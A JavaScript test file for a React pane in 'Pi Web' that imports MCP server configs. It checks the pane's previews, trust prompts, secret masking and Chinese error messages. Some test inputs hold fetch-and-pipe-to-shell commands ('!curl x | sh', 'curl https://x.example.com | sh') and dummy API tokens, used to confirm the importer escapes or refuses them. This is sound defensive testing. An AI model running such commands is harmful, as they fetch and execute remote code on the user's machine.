import assert from "node:assert/strict";
import test from "node:test";
import { createJiti } from "jiti";

const jiti = createJiti(import.meta.url, {
  jsx: { runtime: "automatic" },
  tsconfigPaths: true,
});
const React = await jiti.import("react");
const { renderToStaticMarkup } = await jiti.import("react-dom/server");
const { I18nProvider } = await jiti.import("@/hooks/useI18n");
const { McpAddServer } = await jiti.import("./McpAddServer.tsx");
const { McpConfigView } = await jiti.import("./McpConfig.tsx");
const { EMPTY_MCP_ADD_DRAFT } = await jiti.import("./mcp-add-helpers.ts");

const h = React.createElement;
const noop = () => {};

function decode(html) {
  return html.replace(/&quot;/g, '"').replace(/&#x27;/g, "'").replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">");
}

function text(html) {
  // A line-break opportunity is no space: the save target's path holds one after each folder.
  return decode(html.replace(/<wbr\/>/g, "").replace(/<[^>]+>/g, " ")).replace(/\s+/g, " ").trim();
}

const globalFile = { scope: "global", path: "/Users/me/.pi/agent/mcp.json", exists: true, problems: [] };
const projectFile = { scope: "project", path: "/Users/me/repo/.pi/mcp.json", exists: false, problems: [] };
const fresh = { requiresTrust: false, trusted: true, decision: null, inherited: false };

function overview(project = { cwd: "/Users/me/repo", trust: fresh, trustFolder: { allowed: true } }, overrides = {}) {
  return {
    mcp: { available: true },
    codemode: { sandbox: { state: "available" }, builtinDisabled: false, preference: "automatic" },
    files: [globalFile, projectFile],
    servers: [],
    ...(project ? { project } : {}),
    ...overrides,
  };
}

function pane(props = {}) {
  return renderToStaticMarkup(h(I18nProvider, null, h(McpAddServer, {
    data: overview(),
    cwd: "/Users/me/repo",
    draft: EMPTY_MCP_ADD_DRAFT,
    busy: false,
    controlsBusy: false,
    failure: null,
    onDraftChange: noop,
    onSubmit: noop,
    ...props,
    ...(props.draft ? { draft: { ...EMPTY_MCP_ADD_DRAFT, ...props.draft } } : {}),
  })));
}

/** The Add button's opening tag and label. */
function addButton(html) {
  const match = decode(html).match(/<button type="button"([^>]*)class="config-button config-button-primary[^"]*"([^>]*)>([^<]*)<\/button>/);
  assert.ok(match, "the pane has its 添加 button");
  return { tag: `${match[1]} ${match[2]}`, label: match[3] };
}

test("the paste box is a textarea that never takes focus by itself on a phone, and 添加 waits for a paste", () => {
  const html = decode(pane());
  assert.match(html, /<textarea id="mcp-add-source" aria-label="要添加的服务器" class="config-add-source-input is-multiline"/);
  assert.doesNotMatch(html, /autofocus|autoFocus/i, "focus is decided on mount, by pointer, never in the markup");
  // The catalogs to browse, in order, at the right of the title.
  assert.deepEqual(
    [...html.matchAll(/<a href="([^"]+)" target="_blank" rel="noopener noreferrer" class="config-add-source-catalog">([^<]+)<\/a>/g)].map((match) => [match[1], match[2]]),
    [
      ["https://glama.ai/mcp/servers", "glama.ai"],
      ["https://smithery.ai/servers", "smithery.ai"],
      ["https://mcp.so/", "mcp.so"],
      ["https://registry.modelcontextprotocol.io/", "MCP Registry"],
      ["https://github.com/mcp", "github.com/mcp"],
    ],
  );
  // The placeholder lists what may be pasted; no sentence under the box repeats it.
  assert.doesNotMatch(html, /config-add-source-hint|Cmd\/Ctrl\+Enter adds it/);
  assert.match(html, /<div class="config-add-source-examples">/, "an empty box offers examples");
  // Every supported format, each named as the preview would name it.
  assert.match(html, /<div class="config-add-source-examples-label">支持的格式（点击填入示例）<\/div>/);
  assert.match(html, /<span class="config-add-source-example-label">codex mcp add<\/span><span class="config-add-source-example-value">codex mcp add fetch -- uvx mcp-server-fetch<\/span>/);
  assert.match(html, /<span class="config-add-source-example-label">Zed 设置<\/span>/);
  assert.equal(html.match(/class="config-add-source-example has-label"/g)?.length, 19);
  assert.match(addButton(html).tag, /disabled=""/);
  assert.equal(addButton(html).label, "添加");
  // An empty box is no refusal: nothing explains Add yet but the hint.
  assert.doesNotMatch(text(html), /还没有可添加的内容/);
});

test("before 添加 the pane shows what would be written: the target as written, names, shell commands, notes", () => {
  const paste = JSON.stringify({
    mcpServers: {
      lint: { command: "npx", args: ["-y", "@acme/lint-mcp", "--api-key=sk-0123456789abcdef0123"], env: { NODE_ENV: "production", HOOK: "!curl x | sh" } },
    },
  });
  const html = pane({ draft: { text: paste } });
  const shown = text(html);
  // The preview, not the box the user pasted into.
  const preview = text(decode(html).match(/<div class="config-detail-grid">[\s\S]*?<\/div><\/div><div class="mcp-config-lines">/)?.[0] ?? "");
  assert.match(preview, /识别为 mcpServers 配置/);
  // As written: the pasted text is on the page already, and masking would let a link's author hide what runs.
  assert.match(preview, /命令 npx -y @acme\/lint-mcp --api-key=sk-0123456789abcdef0123/);
  assert.doesNotMatch(preview, /Parts that look like secrets are hidden/);
  assert.match(preview, /环境变量 NODE_ENV HOOK 这里不显示其值。/);
  assert.doesNotMatch(preview, /production|curl x/, "env values are never shown");
  assert.match(shown, /args\[2\] 在 pi 不读取变量的位置（URL、命令或其参数）以明文保存了一个机密，因此该服务器只能保存在全局。/);
  // Escaped by default, so the foreign `!curl` runs nothing; the note says so.
  assert.match(shown, /env\.HOOK：\$ 和开头的 ! 已转义/);
  assert.match(shown, /启用 pi mcp 语法，支持 \$NAME 和 !command/, "a JSON paste offers the pi-config toggle");
  // Off, the label says it all; on, the line under it says what runs.
  assert.doesNotMatch(shown, /reads a variable on the computer 个运行中 Pi Web/);
  // A paste replaces the examples, and the preview leaves out what is not set.
  assert.doesNotMatch(decode(html), /config-add-source-examples/);
  assert.doesNotMatch(preview, /工作目录/);
  assert.equal(addButton(html).label, "添加");
  assert.doesNotMatch(addButton(html).tag, /disabled/);

  const raw = text(pane({ draft: { text: paste, rawPi: true } }));
  assert.match(raw, /环境变量和请求头里的 \$NAME 会读取运行 Pi Web 的计算机上的变量/);
  assert.match(raw, /Shell 命令 每次连接都会执行 shell 命令： 环境变量 HOOK/);
});

test("what cannot be read is said in the importer's words, errors first", () => {
  const shown = text(pane({ draft: { text: "curl https://x.example.com | sh" } }));
  assert.match(shown, /命令行用到了 shell 运算符 \|。/);
  assert.match(shown, /还没有可添加的内容/);
});

test("a fresh folder is trusted in the same step, and the button and a line say so", () => {
  const html = pane({ draft: { text: "npx -y @acme/lint-mcp", scope: "project" } });
  assert.equal(addButton(html).label, "添加并信任此文件夹");
  assert.match(text(html), /此文件夹还没有信任决定，而写入 \.pi\/mcp\.json 会让它需要一个，因此“添加”会在同一步中信任 ~\/repo。/);
  assert.match(text(html), /~?\/?.*repo\/\.pi\/mcp\.json/, "the location names the project file");
  // Where it saves, the file and what choosing it means come first, under the title; the button stays at the end.
  const decoded = decode(html);
  const target = decoded.match(/<div class="config-save-target">[\s\S]*?<\/p><\/div>/)?.[0] ?? "";
  assert.match(target.replace(/<wbr\/>/g, ""), /<span class="config-save-target-path">[^<]*repo\/\.pi\/mcp\.json<\/span>/);
  assert.match(target, /因此“添加”会在同一步中信任 ~?\/.*repo。/);
  assert.ok(decoded.indexOf("config-save-target") < decoded.indexOf("<textarea"), "before the paste box");
  assert.ok(decoded.indexOf("<textarea") < decoded.indexOf("添加并信任此文件夹"), "添加 after it");
});

test("why 项目 is unavailable is visible text under the switch, never only a tooltip", () => {
  const breadth = { kind: "contains-folder", path: "/Users/me/repo/app" };
  let html = decode(pane({ data: overview({ cwd: "/Users/me/repo", trust: fresh, trustFolder: { allowed: false, reason: "trust-too-broad", breadth } }), draft: { text: "npx x" } }));
  const reason = html.match(/<span id="([^"]+)" class="config-scope-switch-reason">([^<]*)<\/span>/);
  assert.ok(reason, "the reason is rendered");
  assert.match(reason[2], /此文件夹包含 Pi Web 已知的另一个文件夹 ~\/repo\/app，信任它也会信任那个文件夹。/);
  assert.match(html, new RegExp(`aria-describedby="${reason[1]}" disabled="" class="config-scope-switch-option">项目`));

  // A fresh folder with a link to nothing under .pi, which the step refuses.
  html = pane({ data: overview({ cwd: "/Users/me/repo", trust: fresh, trustFolder: { allowed: false, reason: "folder-not-fresh" } }), draft: { text: "npx x" } });
  assert.match(text(html), /有一个指向不存在目标的链接。目标出现后它就需要信任，因此 Pi Web 不会自行信任此文件夹。/);

  // A literal secret, with the way out: read it from a host variable, with the control that does it.
  const secret = JSON.stringify({ mcpServers: { api: { url: "https://api.example.com/mcp", headers: { Authorization: "Bearer sk-live-0123456789abcdef0123" } } } });
  html = pane({ draft: { text: secret } });
  assert.match(text(html), /headers\.Authorization 以明文保存了一个机密，因此该服务器只能保存在全局。要保存在项目中，请为它选择“从运行 Pi Web 的计算机上的变量读取”。/);
  assert.match(text(html), /粘贴内容中的机密 headers\.Authorization 以明文保存了一个机密。 从运行 Pi Web 的计算机上的变量读取 按粘贴的内容保存到 mcp\.json，因此该服务器只能保存在全局文件中。/);
  assert.doesNotMatch(text(html), /headers\.Authorization 以明文保存了一个机密，因此该服务器只能保存在全局 mcp\.json/, "the importer's note gives way to the row that says it");
  assert.ok(!html.replace(/<textarea[\s\S]*?<\/textarea>/, "").includes("sk-live"), "the secret itself is shown only in the box it was pasted into");
  // Picked while available and blocked since: the pane's own line, which Add points at.
  html = decode(pane({ draft: { text: secret, scope: "project" } }));
  const line = html.match(/<p id="([^"]+)" class="mcp-config-line is-warning">headers\.Authorization 以明文保存了一个机密，因此该服务器只能保存在全局。要保存在项目中，请为它选择“从运行 Pi Web 的计算机上的变量读取”。/);
  assert.ok(line);
  assert.match(addButton(html).tag, new RegExp(`aria-describedby="${line[1]}"`));
  assert.match(addButton(html).tag, /disabled=""/);

  // No project at all.
  assert.match(text(pane({ data: overview(null), cwd: null, draft: { text: "npx x" } })), /打开一个项目后，才能把服务器添加到它的 \.pi\/mcp\.json。/);
  // A project that needs trust first offers the trust dialog, where it would.
  html = pane({
    data: overview({ cwd: "/Users/me/repo", trust: { requiresTrust: true, trusted: false, decision: null, inherited: false } }),
    draft: { text: "npx x" },
    onTrustProject: noop,
  });
  assert.match(text(html), /此项目未受信任，因此 Pi Web 不会写入它的 \.pi\/mcp\.json。请先信任它。/);
  // The way to make Project available sits under its reason, in the save target.
  assert.match(decode(html), /<div class="config-save-target">[\s\S]*?class="config-scope-switch-reason">此项目未受信任，因此 Pi Web 不会写入它的 \.pi\/mcp\.json。请先信任它。[^<]*<\/span><\/div><span class="mcp-config-line"><button[^>]*>信任项目…<\/button><\/span><\/div>/);
});

test("the name comes right after the paste, with the importer's notes about it, which go once it is edited", () => {
  const paste = JSON.stringify({ mcpServers: { "My Server!": { command: "npx", args: ["-y", "@acme/lint-mcp"] } } });
  let shown = text(pane({ draft: { text: paste } }));
  assert.match(shown, /要添加的服务器 .* 名称 My Server! 变成了 My-Server：pi 服务器名称只能使用字母、数字、_ 和 -。 预览 /);
  assert.equal(shown.match(/变成了 My-Server/g)?.length, 1, "said once, under the name, not again with the preview's notes");
  // Typed over, the note would describe a name no longer in the box.
  shown = text(pane({ draft: { text: paste, name: "lint" } }));
  assert.doesNotMatch(shown, /became My-服务器/);
  assert.match(shown, /名称 预览 /);
});

test("a password field takes a host variable instead, and the name field says when the name is taken", () => {
  const paste = JSON.stringify({
    servers: { gh: { type: "http", url: "https://api.example.com/mcp", headers: { Authorization: "Bearer ${input:pat}" } } },
    inputs: [{ id: "pat", type: "promptString", password: true, description: "GitHub personal access token" }],
  });
  let html = decode(pane({ draft: { text: paste } }));
  // The box shows what the paste held there; the line under it, what is stored around the value.
  assert.match(html, /<input class="mcp-add-input" type="password" aria-label="pat" autoComplete="off" placeholder="\$\{input:pat\}"[^>]*value=""\/>/);
  assert.match(text(html), /GitHub personal access token/);
  assert.match(text(html), /保存为 Bearer ‹填写的值›。/);
  assert.match(text(html), /从运行 Pi Web 的计算机上的变量读取/);
  assert.match(text(html), /请先填写 pat。/);
  html = decode(pane({ draft: { text: paste, references: { "input.pat": "GH_TOKEN" } } }));
  assert.match(html, /aria-label="pat 的变量"[^>]*value="GH_TOKEN"\/>/);
  assert.match(text(html), /保存为 Bearer \$\{GH_TOKEN\}：pi 每次连接时读取该变量/);
  // The preview then says the header sends that variable.
  assert.match(text(html), /主机环境变量 每次连接都会把运行 Pi Web 的计算机上的环境变量发送给此服务器： 请求头 Authorization 中的 GH_TOKEN/);
  assert.doesNotMatch(addButton(html).tag, /disabled/);

  html = pane({ data: overview(undefined, { servers: [{ name: "gh", scope: "global" }] }), draft: { text: paste, references: { "input.pat": "GH_TOKEN" } } });
  assert.match(text(html), /\.pi\/agent\/mcp\.json 中已有名为 gh 的服务器。/);
  assert.match(text(html), /使用 gh-2/);
});

test("a placeholder in a header says only what to type: the box holds the placeholder, the line what is stored around it", () => {
  const paste = `claude mcp add-json github '{"type":"http","url":"https://api.githubcopilot.com/mcp","headers":{"Authorization":"Bearer YOUR_GITHUB_PAT"}}'`;
  let html = decode(pane({ draft: { text: paste } }));
  assert.match(html, /aria-label="Authorization" autoComplete="off" placeholder="YOUR_GITHUB_PAT"[^>]*value=""\/>/);
  assert.match(text(html), /保存为 Bearer ‹填写的值›。 可选：留空则不发送请求头 Authorization/);
  // No reason for a plain placeholder, no "In the paste" line repeating the box, no warning repeating the scope switch.
  assert.doesNotMatch(text(html), /此处填写|在粘贴内容中|按所填的值保存|它所属的值/);
  // Once typed, the scope switch says the secret keeps the server global, once.
  html = decode(pane({ draft: { text: paste, values: { "headers.Authorization": "ghp_x" } } }));
  assert.equal(text(html).match(/只能保存在全局/g)?.length, 1);

  // A value the field makes up whole needs no line: the box says it all.
  const whole = JSON.stringify({ mcpServers: { api: { command: "npx", args: ["api"], env: { API_KEY: "<your-api-key>" } } } });
  html = decode(pane({ draft: { text: whole } }));
  assert.match(html, /aria-label="API_KEY" autoComplete="off" placeholder="<your-api-key>"[^>]*value=""\/>/);
  assert.doesNotMatch(text(html), /保存为|可选：/);
});

test("a pasted secret read from a variable says how it is stored, and a name pi refuses says so under its box", () => {
  const secret = JSON.stringify({ mcpServers: { api: { url: "https://api.example.com/mcp", headers: { Authorization: "Bearer sk-live-0123456789abcdef0123" } } } });
  let html = decode(pane({ draft: { text: secret, scope: "project", secretReferences: { "headers.Authorization": "API_TOKEN" } } }));
  assert.match(html, /aria-label="headers.Authorization 的变量"[^>]*value="API_TOKEN"\/>/);
  assert.match(text(html), /保存为 Bearer \$\{API_TOKEN\}：pi 每次连接时读取该变量/);
  assert.equal(addButton(html).label, "添加并信任此文件夹");
  assert.doesNotMatch(addButton(html).tag, /disabled/);

  html = decode(pane({ draft: { text: secret, secretReferences: { "headers.Authorization": "api-token" } } }));
  const problem = html.match(/aria-invalid="true" aria-describedby="([^"]+)"/);
  assert.ok(problem, "the box points at its reason");
  assert.match(html, new RegExp(`<span id="${problem[1]}" class="mcp-config-line is-error">headers\\.Authorization：变量名只能包含字母`));
  assert.match(text(html), /请先更正 headers\.Authorization。/);
  assert.doesNotMatch(text(html), /请填写 headers\.Authorization/);

  const field = JSON.stringify({ mcpServers: { gh: { command: "npx", args: ["gh"], env: { GITHUB_TOKEN: "YOUR_TOKEN" } } } });
  html = decode(pane({ draft: { text: field, references: { "env.GITHUB_TOKEN": "my-token" } } }));
  assert.match(html, /aria-label="GITHUB_TOKEN 的变量"[^>]*aria-invalid="true" aria-describedby="[^"]+"/);
  assert.match(text(html), /GITHUB_TOKEN：变量名只能包含字母、数字和 _/);
  assert.match(text(html), /请先更正 GITHUB_TOKEN。/);
});

test("a variable box opens with the name it suggests, and an emptied one asks for a name instead of refusing it", () => {
  // The e2e case: a literal env secret, read from a variable instead.
  const secret = JSON.stringify({ mcpServers: { api: { command: "npx", args: ["api"], env: { API_TOKEN: "sk-live-0123456789abcdef0123" } } } });
  let html = decode(pane({ draft: { text: secret, secretReferences: { "env.API_TOKEN": "" } } }));
  assert.match(html, /aria-label="env.API_TOKEN 的变量" placeholder="API_TOKEN"[^>]*value=""\/>/);
  assert.match(text(html), /env\.API_TOKEN：请输入要读取的变量名。/);
  assert.doesNotMatch(text(html), /变量名只能包含字母/);
  assert.match(text(html), /请先填写 env\.API_TOKEN。/);
  // Ticking the box puts the suggestion in it (`suggestedName ?? ""`), which the pane takes as it is.
  html = decode(pane({ draft: { text: secret, secretReferences: { "env.API_TOKEN": "API_TOKEN" } } }));
  assert.doesNotMatch(html, /aria-invalid/);
  assert.match(text(html), /保存为 \$\{API_TOKEN\}/);
  // A header's suggestion is made from the server's name; a field's from where its value goes.
  const header = JSON.stringify({ mcpServers: { docs: { url: "https://docs.example.com/mcp", headers: { Authorization: "Bearer sk-live-0123456789abcdef0123" } } } });
  assert.match(decode(pane({ draft: { text: header, secretReferences: { "headers.Authorization": "" } } })), /aria-label="headers.Authorization 的变量" placeholder="DOCS_TOKEN"[^>]*value=""\/>/);
  const field = JSON.stringify({ mcpServers: { gh: { command: "npx", args: ["gh"], env: { GH_PAT: "YOUR_TOKEN" } } } });
  html = decode(pane({ draft: { text: field, references: { "env.GH_PAT": "" } } }));
  assert.match(html, /aria-label="GH_PAT 的变量" placeholder="GH_PAT"[^>]*value=""\/>/);
  assert.match(text(html), /GH_PAT：请输入要读取的变量名。/);
});

test("a refused 添加 says why; host variables are added only through an explicit second button", () => {
  let html = pane({
    draft: { text: "https://api.example.com/mcp" },
    failure: { error: "x", reason: "host-env-confirm", names: ["GH_TOKEN"] },
  });
  assert.match(decode(html), /<div role="alert" class="mcp-add-failure">/);
  assert.match(text(html), /未添加： 该服务器会收到运行 Pi Web 的计算机上的变量，请先确认。/);
  assert.match(text(html), /读取了 GH_TOKEN，这些变量已在运行 Pi Web 的计算机上设置/);
  assert.match(text(html), /添加并发送这些值/);

  html = pane({ draft: { text: "npx x", scope: "project" }, failure: { error: "x", reason: "trust-too-broad", breadth: { kind: "contains-agent-dir", path: "/Users/me/.pi/agent" } } });
  assert.match(text(html), /未添加： 此文件夹包含 Pi 的 agent 文件夹（~?\/.*\.pi\/agent）/);
  html = pane({ draft: { text: "{" }, failure: { error: "x", reason: "import-failed", notes: [{ code: "invalid-json", params: { detail: "Unexpected end" } }] } });
  assert.match(text(html), /这看起来像 JSON，但无法解析：Unexpected end/);
  html = pane({ draft: { text: "x" }, failure: { error: "x", timedOut: true } });
  assert.match(text(html), /未添加： Pi Web 没有及时响应/);
  // The write failed after trusting, and the trust could not be taken back: said in words, not only in the diagnostic.
  html = pane({
    draft: { text: "npx x", scope: "project" },
    failure: { error: "x; the folder stays trusted", reason: "locked", trustKept: true, trust: { requiresTrust: false, trusted: true, decision: true, decisionPath: "/Users/me/repo", inherited: false } },
  });
  assert.match(text(html), /未添加： .* Pi Web 为这一步信任了 ~?\/?.*repo，但无法撤销，因此该文件夹仍受信任。/);
  assert.doesNotMatch(text(html), /the folder stays trusted$/m, "not the English diagnostic");

  // Refusals worded as an Add's, not as the switch's, Test's or a session's.
  html = pane({ draft: { text: "https://api.example.com/mcp" }, failure: { error: 'server "server": url must be an http or https URL', reason: "server-invalid", name: "server" } });
  assert.match(text(html), /未添加： 按所填的值，pi 会拒绝它：server "server": url must be an http or https URL/);
  assert.doesNotMatch(text(html), /does not connect it/);
  html = pane({ draft: { text: "https://api.example.com/mcp" }, failure: { error: "x", reason: "web-password", name: "server" } });
  assert.match(text(html), /未添加： 它引用了 PI_WEB_PASSWORD，因此 Pi Web 不会添加它。/);
});

test("设置 › MCP opens the add pane from the sidebar, keeps the draft, and says what 添加 wrote", () => {
  const html = renderToStaticMarkup(h(I18nProvider, null, h(McpConfigView, {
    cwd: null,
    load: { state: "loaded", data: overview(null) },
    selected: null,
    refreshing: false,
    embedded: true,
    adding: true,
    addDraft: { ...EMPTY_MCP_ADD_DRAFT, text: "npx -y @acme/lint-mcp" },
    onSelect: noop,
    onRefresh: noop,
    onCodemodeChange: noop,
    onClose: noop,
  })));
  assert.match(decode(html), /<button type="button" aria-current="page" class="config-list-action-button">[\s\S]*?添加 MCP<\/button>/);
  // The name first, under the paste box, with the note on where it came from; then the preview, which
  // leaves out what is not set: no working directory and no env names, rather than "None".
  assert.match(text(html), /要添加的服务器 npx -y @acme\/lint-mcp 名称 根据它的地址或命令命名为 lint。 预览 识别为 命令行 传输方式 stdio 命令 npx -y @acme\/lint-mcp 添加 /);
  assert.match(decode(html), /aria-label="名称"[^>]*value="lint"\/>/);
  // The added notice: the server and its file, the folder trusted with it, the test, and Sign in.
  const addedView = (props = {}) => renderToStaticMarkup(h(I18nProvider, null, h(McpConfigView, {
    cwd: "/Users/me/repo",
    load: {
      state: "loaded",
      data: overview({ cwd: "/Users/me/repo", trust: { requiresTrust: true, trusted: true, decision: true, decisionPath: "/Users/me/repo", inherited: false } }, {
        servers: [{
          name: "docs", scope: "project", sourcePath: projectFile.path, configKey: "k", enabled: true, validated: true,
          transport: "http", url: "https://docs.example.com/mcp", envNames: [], headerNames: [], usesOAuth: true,
          commandFields: [], variableReferences: [], masked: false,
          status: { origin: "test", state: "needs-auth", tools: [], toolCount: 0, testedAt: Date.now(), durationMs: 10 },
        }],
      }),
    },
    selected: "project\0docs",
    refreshing: false,
    embedded: true,
    added: { scope: "project", name: "docs", path: projectFile.path, key: "project\0docs", trustedFolder: "/Users/me/repo" },
    onSelect: noop,
    onRefresh: noop,
    onCodemodeChange: noop,
    onClose: noop,
    ...props,
  })));
  const notice = addedView();
  // Short on a phone: the project file from the panel's folder, and that folder as the button named it.
  assert.match(text(notice), /已把 docs 添加到 \.\/\.pi\/mcp\.json，并信任了此文件夹。 它要求登录。/);
  assert.match(decode(notice), /<div role="status" class="config-notice has-action">[\s\S]*?<button type="button" class="config-button config-button-primary config-button-small">登录<\/button>/);
  // Outside the home folder too, where `~` shortens nothing (the e2e run's folder). The detail
  // pane's File row still shows the whole path.
  const far = "/private/tmp/work/some/long/folder/project";
  const farView = decode(renderToStaticMarkup(h(I18nProvider, null, h(McpConfigView, {
    cwd: far,
    load: {
      state: "loaded",
      data: overview({ cwd: far, trust: { requiresTrust: true, trusted: true, decision: true, decisionPath: far, inherited: false } }, {
        files: [globalFile, { ...projectFile, path: `${far}/.pi/mcp.json`, exists: true }],
        servers: [{
          name: "docs", scope: "project", sourcePath: `${far}/.pi/mcp.json`, configKey: "k", enabled: true, validated: true,
          transport: "http", url: "https://docs.example.com/mcp", envNames: [], headerNames: [], usesOAuth: false,
          commandFields: [], variableReferences: [], masked: false,
        }],
      }),
    },
    selected: "project\0docs",
    refreshing: false,
    embedded: true,
    added: { scope: "project", name: "docs", path: `${far}/.pi/mcp.json`, key: "project\0docs", trustedFolder: far },
    onSelect: noop,
    onRefresh: noop,
    onCodemodeChange: noop,
    onClose: noop,
  }))));
  const farNotice = farView.match(/<div role="status" class="config-notice[^"]*">([\s\S]*?)<\/div>/)?.[1] ?? "";
  assert.equal(text(farNotice), "已把 docs 添加到 ./.pi/mcp.json，并信任了此文件夹。");
  assert.match(text(farView), new RegExp(`文件 ${far.replace(/[/.]/g, "\\$&")}\\/\\.pi\\/mcp\\.json`));
  // A global Add names its file as the other panels do, and a folder other than the panel's by its path.
  const globalNotice = text(addedView({ added: { scope: "global", name: "docs", path: globalFile.path, key: "project\0docs" } }));
  assert.match(globalNotice, /已把 docs 添加到 ~\/\.pi\/agent\/mcp\.json。/);
  const elsewhere = text(addedView({ added: { scope: "project", name: "docs", path: projectFile.path, key: "project\0docs", trustedFolder: "/Users/me/other" } }));
  assert.match(elsewhere, /已把 docs 添加到 \.\/\.pi\/mcp\.json，并信任了 ~\/other。/);
  // A Sign out of the same server on its way would cancel a sign-in started now, so the notice's
  // Sign in waits for it, as the row's does.
  const signingOut = decode(addedView({ busy: "sign-out:project\0docs" }));
  assert.match(text(signingOut), /它要求登录。/);
  assert.doesNotMatch(signingOut.slice(signingOut.indexOf("已添加 docs"), signingOut.indexOf("</div>", signingOut.indexOf("已添加 docs"))), /登录</);
});
